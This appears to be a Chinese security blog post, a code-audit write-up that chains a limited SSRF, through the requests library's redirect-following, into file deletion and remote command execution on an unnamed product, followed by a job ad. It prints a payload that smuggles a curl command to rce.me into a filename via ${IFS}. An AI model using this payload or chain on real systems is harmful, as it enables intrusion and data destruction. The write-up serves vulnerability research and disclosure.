> 原文链接: https://www.anquanke.com//post/id/248821 


# 记一次从鸡肋SSRF到RCE的代码审计过程


                                阅读量   
                                **54070**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t014fb799eb034b6d24.png)](https://p5.ssl.qhimg.com/t014fb799eb034b6d24.png)

> 作者：TheKingOfDuck[@0KEE](https://github.com/0KEE) TEAM

Python标准库中用来处理HTTP相关的模块是urllib/urllib2，不过其中的API十分零碎，比如urllib库有urlencode,但urllib2没有,经常需要混在一起使用,换个运行环境可能又无法正常运行,除了urllib和urllib2之外,会经常看到的还有一个urllib3,该模块是服务于升级的http 1.1标准，且拥有高效http连接池管理及http代理服务的功能库,但其并非python内置,需要自行安装,使用起来仍很复杂,比如urllib3对于POST和PUT请求(request),需要手动对传入数据进行编码，然后再加在URL之后,非常麻烦。requests是用基于urllib3封装的,继承了urllib2的所有特性,遵循Apache2 Licensed开源协议的HTTP库，支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动响应内容的编码，支持国际化的URL和POST数据自动编码。如他的口号HTTP for Humans所说,这才是给人用的HTTP库,实际使用过程中更方便,能够大大的提高使用效率,缩短写代码的时间。

[![](https://p5.ssl.qhimg.com/t0167541f869acda0e5.jpg)](https://p5.ssl.qhimg.com/t0167541f869acda0e5.jpg)

实战中遇到过这样一个案例,一个输入密码正确后会302跳转到后台页面的登录口存在盲注,但登录数据有加密,无法试用sqlmap完成自动注入的过程,于是想编写python脚本自动化完成这个过程,requests是首选,实际编写过程中会发现默认属性下其无法获取到30X状态码的详情,分析其代码后发现requests的所有请求方法(GET/POST/HEAD/PUT/DELETE)均会默认跟随30X跳转,继承了urlib3默认跟随30X跳转的属性,并将30X连续跳转的次数上限从3次修改为30次,如果返回状态码是304/305/306/309会保持原来的请求方法,但不会跳转,返回状态码是307/308会保持原请求方法,并且跳转,其他30x状态码则会将请求方法转化为GET。如需禁止跳转需将allow_redirects属性的值设置为False。

下面将分享一个因为这个特性导致的从ssrf到rce的漏洞组合拳。



## 0x01 起

某系统的升级功能可配置自定义的站点, 点击升级按钮后会触发向特定路由发送文件, 也就是一个鸡肋的`POST`类型的**路由和参数均不可控**的`SSRF`。

[![](https://p5.ssl.qhimg.com/t01281d1a68e3e64e17.jpg)](https://p5.ssl.qhimg.com/t01281d1a68e3e64e17.jpg)

如下图,`**_update`是从用户自定义的配置中取的, 与固定的`route`变量拼接后作为发送文件的`url`

[![](https://p4.ssl.qhimg.com/t01ba512f5041b07802.png)](https://p4.ssl.qhimg.com/t01ba512f5041b07802.png)

利用上文提到的requests默认跟随状态码`30X`跳转的特性, 可将这个鸡肋的`SSRF`变成一个`GET`类型的**路由和参数均可控**的`SSRF`

[![](https://p3.ssl.qhimg.com/t010952b8c7c3863f28.jpg)](https://p3.ssl.qhimg.com/t010952b8c7c3863f28.jpg)

[![](https://p2.ssl.qhimg.com/t01e997173a48e5787f.jpg)](https://p2.ssl.qhimg.com/t01e997173a48e5787f.jpg)



## 0x02 承

该软件的分层大致如下图, 鉴权在应用层, 涉及数据涉及敏感操作的均通过api调用另一个端口的上的服务, 该过程无鉴权。思路比较清晰, 可审计服务层的代码漏洞结合已有的`SSRF`进一步扩大危害。

[![](https://p2.ssl.qhimg.com/t01f9250cfd995611ad.jpg)](https://p2.ssl.qhimg.com/t01f9250cfd995611ad.jpg)

受这个`SSRF`本身的限制, 寻找服务层漏洞时优先看请求方式为`GET`的路由, 筛选后找到一个符合条件的漏洞点如下图所示, 传入的`doc_file_path`参数可控, 如果文件名中能带入自己的恶意`Payload`且文件能够存在的情况下, 拼接到`cmd`变量中后有机会`RCE`。

[![](https://p2.ssl.qhimg.com/t01eefbb58857224d4c.png)](https://p2.ssl.qhimg.com/t01eefbb58857224d4c.png)

走到命令拼接的前置条件是文件存在, 故先查看上传部分代码, 如下图所示, [mkstemp方法](https://docs.python.org/zh-cn/3/library/tempfile.html#tempfile.mkstemp)的作用是以最安全的方式创建一个临时文件, 该文件的文件名随机, 创建后不会自动删除, 需用户自行将其删除, `suffixs`是指定的后缀, 也就是说文件虽然可以落地, 但文件名不可控, 无法拼接自己的`Payload`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e6e4573c91fcf083.png)

此时只能作为一个任意文件删除的漏洞来使用, 配置升级链接`301`跳转到`http://127.0.0.1:8848/api/doc?doc_file_path=/etc/passwd`, 其中`doc_file_path`参数为已知的存在的文件, 点击系统升级按钮即可触发删除操作。

[![](https://p0.ssl.qhimg.com/t01e8160b1d6d4a5d7a.jpg)](https://p0.ssl.qhimg.com/t01e8160b1d6d4a5d7a.jpg)



## 0x03 转

继续分析代码，阅读大量代码后找到一处上传文件的功能点如下图所示, 其中`file_pre`为源文件名, 拼接下划线,时间戳以及`.txt`后保存并返回了完整的文件路径，正好符合上面的要求。

[![](https://p2.ssl.qhimg.com/t0127583f02b16255b7.png)](https://p2.ssl.qhimg.com/t0127583f02b16255b7.png)

源文件名可控, 路径已知,`SSRF`升级`RCE`变得索然无味, 使用分号切割命令语句,带参数的命令可以使用`$`{`IFS`}``绕一下空格问题, 涉及到的`$`{`;`均为unix系统文件名允许使用范围的字符。

[![](https://p1.ssl.qhimg.com/t01609aab737084d410.jpg)](https://p1.ssl.qhimg.com/t01609aab737084d410.jpg)

[![](https://p3.ssl.qhimg.com/t0143d6cc214ce51fc2.jpg)](https://p3.ssl.qhimg.com/t0143d6cc214ce51fc2.jpg)



## 0x04 合

参数及路由均不可控`POST`类型的`SSRF` -&gt; `requests` `30X`跳转特性 -&gt; 参数和路由均可控的`GET`类型`SSRF` -&gt; 文件名部分可控的文件上传 -&gt; 多点结合攻击本地服务

最终Payload如下:

```
http://127.0.0.1:8848/api/doc?doc_file_path=
/opt/work/files/target_file/admin/;curl$`{`IFS`}`rce.me;_1623123227304.txt
```

[![](https://p1.ssl.qhimg.com/t019ecc8a33d1b85373.jpg)](https://p1.ssl.qhimg.com/t019ecc8a33d1b85373.jpg)

配置完成手动点击一下升级功能即可触发命令执行。

[![](https://p0.ssl.qhimg.com/t01a739ac7a50340ab2.jpg)](https://p0.ssl.qhimg.com/t01a739ac7a50340ab2.jpg)



## 0x05 招

社招-高级安全工程师（安全评估与渗透测试方向）

岗位职责

1、承担360政企安全集团ToB安全产品应用层渗透测试、安全评估、代码审计；

2、研究跟进最新安全动态、安全漏洞，对互联网重大安全漏洞关联到产品进行响应分析；

3、参与内部安全平台的建设；

任职要求

0、1-3年工作经验、接受优秀校招、实习生；

1、熟练掌握Web渗透、代码级漏洞挖掘等手法与漏洞原理、挖掘方法；

2、熟悉java、Go等主流服务端开发语言的代码审计；

3、熟练使用sqlmap、burpsuite、metasploit等常见安全测试工具，了解原理，熟悉代码并且对其进行过二次开发者优先；

4、熟练使用至少一门开发语言，包括但不限于C/C++/JAVA/Go;

5、具有良好的沟通协调能力、较强的团队合作精神、优秀的执行能力；

6、有很强的分析问题和解决问题的能力。

加分项

1、挖掘过国内主流安全厂商ToB 安全产品的高质量0day或者1day漏洞；

2、有互联网企业SDL落地经验；

3、有客户端漏洞挖掘经验更佳；

4、熟悉并掌握Spring框架并针对Spring类框架的项目进行过代码审计；

5、在国家级、直辖市级、省级大型攻防演练项目中负责目标系统代码审计工作并有一定产出。

投递邮箱：g-[0kee@360.cn](mailto:0kee@360.cn)
